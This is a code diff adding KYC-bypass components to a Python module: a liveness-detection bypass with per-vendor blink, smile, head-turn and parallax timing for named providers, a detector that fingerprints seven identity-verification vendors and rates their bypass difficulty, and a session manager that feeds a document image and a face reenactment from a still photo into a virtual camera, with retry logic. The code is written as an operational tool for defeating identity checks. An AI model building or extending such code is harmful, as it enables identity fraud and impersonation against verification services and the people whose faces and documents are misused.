@@ -628,3 +628,564 @@ class IntegrityShield:
         env.update(IntegrityShield.get_env_vars())
         
         return subprocess.Popen(command, env=env, **kwargs)
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+# V7.6 P0 UPGRADE: LIVENESS DETECTION BYPASS
+# Counter common liveness challenges used by KYC providers
+# ═══════════════════════════════════════════════════════════════════════════
+
+class LivenessDetectionBypass:
+    """
+    V7.6: Bypasses liveness detection challenges used by KYC providers.
+    
+    Common liveness challenges:
+    - Blink detection (2-3 blinks in sequence)
+    - Smile detection (natural smile progression)
+    - Head turn (left/right/up/down)
+    - Random text reading (lip movement)
+    - 3D depth check (parallax movement)
+    
+    This engine provides motion sequences to pass each challenge type.
+    """
+    
+    # Challenge timing profiles per provider
+    PROVIDER_TIMING = {
+        'onfido': {
+            'blink_count': 2,
+            'blink_interval_ms': 800,
+            'head_turn_duration_ms': 1500,
+            'smile_ramp_ms': 600,
+        },
+        'jumio': {
+            'blink_count': 3,
+            'blink_interval_ms': 700,
+            'head_turn_duration_ms': 2000,
+            'smile_ramp_ms': 800,
+        },
+        'veriff': {
+            'blink_count': 2,
+            'blink_interval_ms': 900,
+            'head_turn_duration_ms': 1800,
+            'smile_ramp_ms': 700,
+        },
+        'sumsub': {
+            'blink_count': 2,
+            'blink_interval_ms': 750,
+            'head_turn_duration_ms': 1600,
+            'smile_ramp_ms': 650,
+        },
+        'default': {
+            'blink_count': 2,
+            'blink_interval_ms': 800,
+            'head_turn_duration_ms': 1500,
+            'smile_ramp_ms': 600,
+        },
+    }
+    
+    def __init__(self, provider: str = 'default'):
+        self.provider = provider
+        self.timing = self.PROVIDER_TIMING.get(provider, self.PROVIDER_TIMING['default'])
+        self._motion_queue = []
+    
+    def generate_blink_sequence(self) -> List[Dict]:
+        """Generate natural blink sequence keyframes."""
+        sequence = []
+        for i in range(self.timing['blink_count']):
+            # Each blink: eyes open -> close -> open
+            base_time = i * self.timing['blink_interval_ms']
+            sequence.extend([
+                {'time_ms': base_time, 'eyes_closed': 0.0},
+                {'time_ms': base_time + 80, 'eyes_closed': 0.9},  # Fast close
+                {'time_ms': base_time + 160, 'eyes_closed': 0.0},  # Open
+            ])
+        return sequence
+    
+    def generate_head_turn_sequence(self, direction: str = 'left') -> List[Dict]:
+        """Generate head turn sequence (left, right, up, down, or circular)."""
+        duration = self.timing['head_turn_duration_ms']
+        
+        if direction == 'circular':
+            # Full circular motion for 3D depth check
+            return [
+                {'time_ms': 0, 'yaw': 0, 'pitch': 0},
+                {'time_ms': duration * 0.25, 'yaw': -15, 'pitch': 0},
+                {'time_ms': duration * 0.5, 'yaw': 0, 'pitch': -10},
+                {'time_ms': duration * 0.75, 'yaw': 15, 'pitch': 0},
+                {'time_ms': duration, 'yaw': 0, 'pitch': 10},
+                {'time_ms': duration * 1.25, 'yaw': 0, 'pitch': 0},
+            ]
+        
+        # Direction mapping
+        angles = {
+            'left': {'yaw': -20, 'pitch': 0},
+            'right': {'yaw': 20, 'pitch': 0},
+            'up': {'yaw': 0, 'pitch': -15},
+            'down': {'yaw': 0, 'pitch': 15},
+        }
+        target = angles.get(direction, angles['left'])
+        
+        return [
+            {'time_ms': 0, 'yaw': 0, 'pitch': 0},
+            {'time_ms': duration * 0.4, 'yaw': target['yaw'], 'pitch': target['pitch']},
+            {'time_ms': duration * 0.6, 'yaw': target['yaw'], 'pitch': target['pitch']},
+            {'time_ms': duration, 'yaw': 0, 'pitch': 0},
+        ]
+    
+    def generate_smile_sequence(self) -> List[Dict]:
+        """Generate natural smile progression."""
+        ramp = self.timing['smile_ramp_ms']
+        return [
+            {'time_ms': 0, 'smile': 0.0, 'mouth_open': 0.0},
+            {'time_ms': ramp * 0.3, 'smile': 0.2, 'mouth_open': 0.05},
+            {'time_ms': ramp * 0.6, 'smile': 0.5, 'mouth_open': 0.1},
+            {'time_ms': ramp, 'smile': 0.8, 'mouth_open': 0.15},
+            {'time_ms': ramp * 1.5, 'smile': 0.9, 'mouth_open': 0.2},
+            {'time_ms': ramp * 2.5, 'smile': 0.5, 'mouth_open': 0.1},
+            {'time_ms': ramp * 3, 'smile': 0.0, 'mouth_open': 0.0},
+        ]
+    
+    def generate_3d_depth_sequence(self) -> List[Dict]:
+        """Generate subtle parallax movement for 3D depth verification."""
+        return [
+            {'time_ms': 0, 'x_offset': 0, 'y_offset': 0, 'scale': 1.0},
+            {'time_ms': 500, 'x_offset': -3, 'y_offset': 0, 'scale': 1.01},
+            {'time_ms': 1000, 'x_offset': 0, 'y_offset': -2, 'scale': 1.02},
+            {'time_ms': 1500, 'x_offset': 3, 'y_offset': 0, 'scale': 1.01},
+            {'time_ms': 2000, 'x_offset': 0, 'y_offset': 2, 'scale': 1.0},
+            {'time_ms': 2500, 'x_offset': 0, 'y_offset': 0, 'scale': 1.0},
+        ]
+    
+    def get_full_liveness_sequence(self, challenges: List[str]) -> List[Dict]:
+        """Generate complete sequence for list of challenges."""
+        sequence = []
+        current_time = 0
+        
+        for challenge in challenges:
+            if challenge == 'blink':
+                frames = self.generate_blink_sequence()
+            elif challenge.startswith('turn_'):
+                direction = challenge.replace('turn_', '')
+                frames = self.generate_head_turn_sequence(direction)
+            elif challenge == 'smile':
+                frames = self.generate_smile_sequence()
+            elif challenge == '3d_depth':
+                frames = self.generate_3d_depth_sequence()
+            else:
+                continue
+            
+            # Offset times and add to sequence
+            for frame in frames:
+                frame['time_ms'] += current_time
+                sequence.append(frame)
+            
+            # Add gap between challenges
+            if frames:
+                current_time = max(f['time_ms'] for f in frames) + 500
+        
+        return sequence
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+# V7.6 P0 UPGRADE: KYC PROVIDER DETECTOR
+# Auto-detect which KYC provider is being used
+# ═══════════════════════════════════════════════════════════════════════════
+
+class KYCProviderDetector:
+    """
+    V7.6: Auto-detect KYC provider from page content.
+    
+    Different providers have different:
+    - Challenge sequences
+    - Timing requirements
+    - Detection methods
+    - Bypass strategies
+    
+    Detection via DOM signatures, API endpoints, and JS fingerprints.
+    """
+    
+    # Provider signatures in page content
+    SIGNATURES = {
+        'onfido': {
+            'dom': ['onfido-sdk', 'onfido-mount', 'onfido__'],
+            'scripts': ['onfido.min.js', 'onfido-sdk'],
+            'api': ['api.onfido.com', 'sdk.onfido.com'],
+        },
+        'jumio': {
+            'dom': ['jumio-', 'netverify', 'jumioiframe'],
+            'scripts': ['jumio', 'netverify'],
+            'api': ['netverify.com', 'jumio.com'],
+        },
+        'veriff': {
+            'dom': ['veriff-', 'veriff__', 'Veriff'],
+            'scripts': ['veriff', 'cdn.veriff.me'],
+            'api': ['api.veriff.me', 'magic.veriff.me'],
+        },
+        'sumsub': {
+            'dom': ['sumsub-', 'idensic', 'WebSDK'],
+            'scripts': ['sumsub', 'idensic', 'websdk'],
+            'api': ['api.sumsub.com', 'test-api.sumsub.com'],
+        },
+        'shufti': {
+            'dom': ['shuftipro', 'shufti-'],
+            'scripts': ['shuftipro'],
+            'api': ['api.shuftipro.com'],
+        },
+        'persona': {
+            'dom': ['persona-', 'withpersona'],
+            'scripts': ['persona'],
+            'api': ['withpersona.com'],
+        },
+        'idenfy': {
+            'dom': ['idenfy-', 'iDenfySDK'],
+            'scripts': ['idenfy', 'sdk.idenfy.com'],
+            'api': ['ivs.idenfy.com'],
+        },
+    }
+    
+    # Provider-specific capabilities
+    CAPABILITIES = {
+        'onfido': {
+            'liveness_type': 'video',
+            'document_capture': True,
+            'nfc_supported': True,
+            'challenges': ['blink', 'smile', 'turn_left', 'turn_right'],
+            'bypass_difficulty': 'high',
+        },
+        'jumio': {
+            'liveness_type': 'photo_sequence',
+            'document_capture': True,
+            'nfc_supported': True,
+            'challenges': ['blink', '3d_depth'],
+            'bypass_difficulty': 'medium',
+        },
+        'veriff': {
+            'liveness_type': 'video',
+            'document_capture': True,
+            'nfc_supported': False,
+            'challenges': ['blink', 'smile', 'turn_left', 'turn_right', 'turn_up'],
+            'bypass_difficulty': 'high',
+        },
+        'sumsub': {
+            'liveness_type': 'photo_sequence',
+            'document_capture': True,
+            'nfc_supported': True,
+            'challenges': ['blink', 'smile'],
+            'bypass_difficulty': 'medium',
+        },
+        'default': {
+            'liveness_type': 'photo',
+            'document_capture': True,
+            'nfc_supported': False,
+            'challenges': ['blink'],
+            'bypass_difficulty': 'low',
+        },
+    }
+    
+    @classmethod
+    def detect_from_html(cls, html_content: str) -> Tuple[str, float]:
+        """
+        Detect KYC provider from HTML content.
+        
+        Returns: (provider_name, confidence)
+        """
+        html_lower = html_content.lower()
+        scores = {}
+        
+        for provider, sig in cls.SIGNATURES.items():
+            score = 0
+            
+            # Check DOM signatures
+            for dom_sig in sig['dom']:
+                if dom_sig.lower() in html_lower:
+                    score += 3
+            
+            # Check script signatures
+            for script_sig in sig['scripts']:
+                if script_sig.lower() in html_lower:
+                    score += 2
+            
+            # Check API signatures
+            for api_sig in sig['api']:
+                if api_sig.lower() in html_lower:
+                    score += 4
+            
+            if score > 0:
+                scores[provider] = score
+        
+        if not scores:
+            return ('unknown', 0.0)
+        
+        # Get highest scoring provider
+        best_provider = max(scores, key=scores.get)
+        max_possible = len(cls.SIGNATURES[best_provider]['dom']) * 3 + \
+                       len(cls.SIGNATURES[best_provider]['scripts']) * 2 + \
+                       len(cls.SIGNATURES[best_provider]['api']) * 4
+        confidence = min(scores[best_provider] / max_possible, 1.0)
+        
+        return (best_provider, confidence)
+    
+    @classmethod
+    def detect_from_network(cls, requests: List[Dict]) -> Tuple[str, float]:
+        """
+        Detect KYC provider from network requests.
+        
+        Args:
+            requests: List of {url, method, headers} dicts
+        """
+        for provider, sig in cls.SIGNATURES.items():
+            for req in requests:
+                url = req.get('url', '').lower()
+                for api_endpoint in sig['api']:
+                    if api_endpoint.lower() in url:
+                        return (provider, 0.95)
+        
+        return ('unknown', 0.0)
+    
+    @classmethod
+    def get_bypass_strategy(cls, provider: str) -> Dict:
+        """Get optimal bypass strategy for detected provider."""
+        caps = cls.CAPABILITIES.get(provider, cls.CAPABILITIES['default'])
+        
+        return {
+            'provider': provider,
+            'liveness_type': caps['liveness_type'],
+            'expected_challenges': caps['challenges'],
+            'use_video_reenactment': caps['liveness_type'] == 'video',
+            'recommended_motions': cls._get_recommended_motions(provider),
+            'timing_profile': LivenessDetectionBypass.PROVIDER_TIMING.get(
+                provider, LivenessDetectionBypass.PROVIDER_TIMING['default']
+            ),
+        }
+    
+    @classmethod
+    def _get_recommended_motions(cls, provider: str) -> List[str]:
+        """Get recommended motion files for provider."""
+        caps = cls.CAPABILITIES.get(provider, cls.CAPABILITIES['default'])
+        motions = []
+        
+        for challenge in caps.get('challenges', []):
+            if challenge == 'blink':
+                motions.append('natural_blink_x2.mp4')
+            elif challenge == 'smile':
+                motions.append('warm_smile.mp4')
+            elif challenge.startswith('turn_'):
+                motions.append(f'head_{challenge}.mp4')
+            elif challenge == '3d_depth':
+                motions.append('subtle_parallax.mp4')
+        
+        return motions
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+# V7.6 P0 UPGRADE: KYC SESSION MANAGER
+# Full KYC session orchestration with retry logic
+# ═══════════════════════════════════════════════════════════════════════════
+
+class KYCSessionManager:
+    """
+    V7.6: Orchestrates complete KYC bypass sessions.
+    
+    Manages:
+    - Provider detection
+    - Document preparation
+    - Liveness challenge handling
+    - Failure recovery with different strategies
+    - Session timing to appear natural
+    """
+    
+    def __init__(self, controller: 'KYCController'):
+        self.controller = controller
+        self.provider = 'unknown'
+        self.provider_confidence = 0.0
+        self.current_stage = 'init'
+        self.attempts = 0
+        self.max_attempts = 3
+        self.session_start = None
+        self._event_log = []
+    
+    def start_session(self, html_content: str = None) -> Dict:
+        """
+        Start a KYC bypass session.
+        
+        Args:
+            html_content: Optional page HTML for provider detection
+        """
+        import time
+        self.session_start = time.time()
+        self.attempts = 0
+        
+        # Detect provider
+        if html_content:
+            self.provider, self.provider_confidence = \
+                KYCProviderDetector.detect_from_html(html_content)
+            self._log_event('provider_detected', {
+                'provider': self.provider,
+                'confidence': self.provider_confidence
+            })
+        
+        # Get bypass strategy
+        strategy = KYCProviderDetector.get_bypass_strategy(self.provider)
+        
+        # Initialize liveness bypass
+        self.liveness_bypass = LivenessDetectionBypass(self.provider)
+        
+        self.current_stage = 'ready'
+        return {
+            'status': 'ready',
+            'provider': self.provider,
+            'confidence': self.provider_confidence,
+            'strategy': strategy,
+        }
+    
+    def handle_document_stage(self, document_path: str) -> Dict:
+        """Handle document capture stage."""
+        self.current_stage = 'document'
+        self._log_event('document_stage', {'document': document_path})
+        
+        # Stream document image to virtual camera
+        success = self.controller.stream_image(document_path)
+        
+        return {
+            'status': 'success' if success else 'failed',
+            'stage': 'document',
+        }
+    
+    def handle_liveness_stage(self, face_image: str, 
+                               challenges: List[str] = None) -> Dict:
+        """
+        Handle liveness detection stage.
+        
+        Args:
+            face_image: Path to face image for reenactment
+            challenges: List of expected challenges (auto-detected if None)
+        """
+        self.current_stage = 'liveness'
+        self.attempts += 1
+        
+        # Use provider-specific challenges if not specified
+        if challenges is None:
+            strategy = KYCProviderDetector.get_bypass_strategy(self.provider)
+            challenges = strategy['expected_challenges']
+        
+        self._log_event('liveness_stage', {
+            'attempt': self.attempts,
+            'challenges': challenges
+        })
+        
+        # Generate motion sequence
+        sequence = self.liveness_bypass.get_full_liveness_sequence(challenges)
+        
+        # Determine motion type based on challenges
+        motion_type = MotionType.BLINK_NATURAL
+        if 'smile' in challenges:
+            motion_type = MotionType.FULL_RANGE
+        elif any(c.startswith('turn_') for c in challenges):
+            motion_type = MotionType.HEAD_NOD
+        
+        # Start reenactment
+        config = ReenactmentConfig(
+            source_image=face_image,
+            motion_type=motion_type,
+            expression_scale=0.8,
+            pose_scale=0.7,
+        )
+        
+        success = self.controller.start_reenactment(config)
+        
+        return {
+            'status': 'streaming' if success else 'failed',
+            'stage': 'liveness',
+            'attempt': self.attempts,
+            'motion_sequence': sequence,
+        }
+    
+    def handle_failure(self, error_type: str) -> Dict:
+        """
+        Handle KYC failure with recovery strategy.
+        
+        Args:
+            error_type: Type of failure (liveness_failed, document_rejected, timeout)
+        """
+        self._log_event('failure', {'type': error_type, 'attempt': self.attempts})
+        
+        if self.attempts >= self.max_attempts:
+            return {
+                'status': 'max_attempts_reached',
+                'action': 'abort',
+                'total_attempts': self.attempts,
+            }
+        
+        # Determine recovery strategy
+        recovery = {
+            'liveness_failed': {
+                'action': 'retry_different_motion',
+                'suggestion': 'Use slower, more natural movements',
+                'wait_seconds': 5,
+            },
+            'document_rejected': {
+                'action': 'retry_different_angle',
+                'suggestion': 'Adjust document lighting and angle',
+                'wait_seconds': 3,
+            },
+            'timeout': {
+                'action': 'retry_immediately',
+                'suggestion': 'Check network and camera connection',
+                'wait_seconds': 2,
+            },
+            'face_not_detected': {
+                'action': 'adjust_position',
+                'suggestion': 'Center face in frame, improve lighting',
+                'wait_seconds': 3,
+            },
+        }
+        
+        return {
+            'status': 'recovery',
+            'error_type': error_type,
+            **recovery.get(error_type, recovery['timeout']),
+            'remaining_attempts': self.max_attempts - self.attempts,
+        }
+    
+    def end_session(self, success: bool = False) -> Dict:
+        """End the KYC session and return summary."""
+        import time
+        
+        self.controller.stop_stream()
+        duration = time.time() - self.session_start if self.session_start else 0
+        
+        summary = {
+            'status': 'success' if success else 'failed',
+            'provider': self.provider,
+            'total_attempts': self.attempts,
+            'duration_seconds': round(duration, 1),
+            'event_log': self._event_log,
+        }
+        
+        self._log_event('session_end', summary)
+        self.current_stage = 'ended'
+        
+        return summary
+    
+    def _log_event(self, event_type: str, data: Dict):
+        """Log session event for debugging."""
+        import time
+        self._event_log.append({
+            'timestamp': time.time(),
+            'type': event_type,
+            'data': data,
+        })
+
+
+# V7.6 Convenience exports
+def create_liveness_bypass(provider: str = 'default'):
+    """V7.6: Create liveness detection bypass"""
+    return LivenessDetectionBypass(provider)
+
+def detect_kyc_provider(html_content: str) -> Tuple[str, float]:
+    """V7.6: Detect KYC provider from HTML"""
+    return KYCProviderDetector.detect_from_html(html_content)
+
+def get_kyc_bypass_strategy(provider: str) -> Dict:
+    """V7.6: Get bypass strategy for KYC provider"""
+    return KYCProviderDetector.get_bypass_strategy(provider)
